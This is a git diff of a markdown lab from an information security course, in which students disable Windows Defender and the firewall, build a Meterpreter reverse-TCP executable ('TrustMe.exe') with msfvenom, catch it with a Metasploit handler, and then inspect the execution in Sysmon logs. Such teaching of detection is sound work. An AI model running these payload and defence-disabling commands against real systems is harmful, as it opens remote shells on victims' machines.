@@ -1,8 +1,16 @@
 ![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)
 
+---
+
+This is a lab from **John Strand**'s **Information Security Core Skills** Course:
+
+https://www.antisyphontraining.com/product/information-security-core-skills-tm/
+
+---
 
 # Sysmon
 
+# Windows VM
 In this lab we will be looking at what an attacker can do with valid accounts.  
 
 To learn more about this attack check out the following:
@@ -16,130 +24,153 @@ Here are just some groups that have used this attack:
 
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
-![](attachments/OpeningPowershell.png)
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/bb7c958d-9879-44d3-a6e2-441139a94caa" />
 
 Next, run the following command in the **Powershell** terminal:
 
-<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+```ps
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 ![](attachments/applocker_disabledefender.png)
+
 This will disable **Defender** for this session.
 
 If you get angry red errors, that is **Ok**, it means **Defender** is not running.
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
-<pre> netsh advfirewall set allprofiles state off</pre>
+```ps
+netsh advfirewall set allprofiles state off
+```
 
 
 Next, set a password for the Administrator account that you can remember
 
-<pre>net user Administrator password1234</pre>
+```ps
+net user Administrator password1234
+```
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-Before we move on from our Powershell window, lets get our IP by running the following command:
 
-<pre>ipconfig</pre>
-
-![](attachments/powershellipconfig.png)
-
-**REMEMBER - YOUR IP WILL BE DIFFERENT**
-
-Write this IP down so we can use it again later.
-
-Let's continue by opening a **Kali** terminal
-
-![](attachments/OpeningKaliInstance.png)
-
-Alternatively, you can click on the **Kali** icon in the taskbar.
-
-![](attachments/TaskbarKaliIcon.png)
+Now we need a **Linux Terminal**
 
 
-We need to run the following commands in order to mount our remote system to the correct directory:
+- **Double-click** `Ubuntu Shell` on Desktop
 
-<pre>sudo su -</pre>
+<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
 
-<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
 
-**If you are at CyberBay, you can use the password we found for Dennis.  What was it?**
 
-**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
+Become root:
 
-If you see the following error, it means that the device is already mounted.
+```bash
+sudo su -
+```
 
-![](attachments/mounterror.png)
 
-If this is the case, ignore it.
+Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
-Run the following command to navigate into the mounted directory:
+```bash
+ifconfig
+```
 
-<pre>cd /mnt/windows-share</pre>
-
-Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
-
-<pre>ifconfig</pre>
-
-![](attachments/ifconfig.png)
+<img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />
 
 **REMEMBER: YOUR IP WILL BE DIFFERENT**
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+```bash
+cd /tmp/
+```
 
-Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
+```bash
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
+```
 
-![](attachments/TaskbarKaliIcon.png)
+Let's start the **Metasploit** Handler. We need another **Linux Terminal**
 
-Let's become root.
+- **Double-click** `Ubuntu Shell` on Desktop
 
-<pre>sudo su -</pre>
+<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
+
 
 Now let's start the **Metasploit** Handler
 
-<pre>msfconsole -q</pre>
+```bash
+sudo msfconsole -q
+```
 
 We are going to run the following commands to correctly set the parameters:
 
-<pre>use exploit/multi/handler</pre>
+```bash
+use exploit/multi/handler
+```
 
-<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
-<pre>set LHOST [Your Linux IP Address]</pre>
+```bash
+set LHOST [Your Linux IP Address]
+```
 
 Remember, **Your IP will be different!**
 
-<pre>exploit</pre>
+```bash
+exploit
+```
 
 It should look like this:
 
-![](attachments/msfconsole.png)
+<img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />
 
-We will need to open a **"cmd.exe"** terminal as **Administrator**.
+Going back to our **Powershell** terminal, copy the file over from **Linux**
 
-![](attachments/OpeningWindowsCommandPrompt.png)
+```ps
+cd .\Desktop\
+```
 
-<pre>cd \IntroLabs</pre>
+```ps
+scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
+```
 
-<pre>Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre>
+
+Now we will need to open a **"cmd.exe"** terminal as **Administrator**.
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/e8526cf1-0ed9-48f6-bd3f-f56af7536463" />
+
+
+```cmd
+cd \IntroLabs
+```
+
+```cmd
+Sysmon64.exe -accepteula -i sysmonconfig-export.xml
+```
 
 It should look like this:
 
-![](attachments/sysmonexe.png)
+<img width="598" height="354" alt="2026-03-13_16-37" src="https://github.com/user-attachments/assets/d8175d3c-e72a-4d57-bdd6-65409afb838a" />
 
-let's run the following commands to run the **"TrustMe.exe"** file.
 
-<pre>cd \</pre>
+Let's run the following commands to run the **"TrustMe.exe"** file.
+
+```cmd
+cd \Users\Administrator\Desktop
+```
  
 Then run it with the following:
 
- <pre>TrustMe.exe</pre>
+```cmd
+TrustMe.exe
+```
 
-Back at your Kali terminal, you should have a metasploit session!
+Back at your **Linux terminal**, you should have a metasploit session!
 
-![](attachments/meterpretersession.png)
+<img width="920" height="136" alt="2026-03-13_16-38" src="https://github.com/user-attachments/assets/35c77cf6-ec9a-4379-a359-c1984f221b72" />
 
 Now, we need to view the Sysmon events for this malware:
 
@@ -157,23 +188,25 @@ You'll have to scroll down a bit until you find the **Sysmon** folder.
 
 Start at the top and work down through the logs, you should see your **malware** executing.  Please note your paths may be different.
 
-![](attachments/logs.png)
 
-![](attachments/processcreateview.png)
+<img width="1325" height="938" alt="2026-03-13_16-45" src="https://github.com/user-attachments/assets/e1038335-5dce-4384-a98d-5683adda1608" />
 
-***
-***Continuing on to the next Lab?***
 
-[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)
+
+
+
+***                                                                 
+<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/WebTestingIntroClass/WebTesting.md)</i></b>
+
+<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/RITAIntroClass/RITA.md)</i></b>
+
+<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>
 
 ***Finished with the Labs?***
-
 
 Please be sure to destroy the lab environment!
 
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
-
-[Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)
 
 ---
 
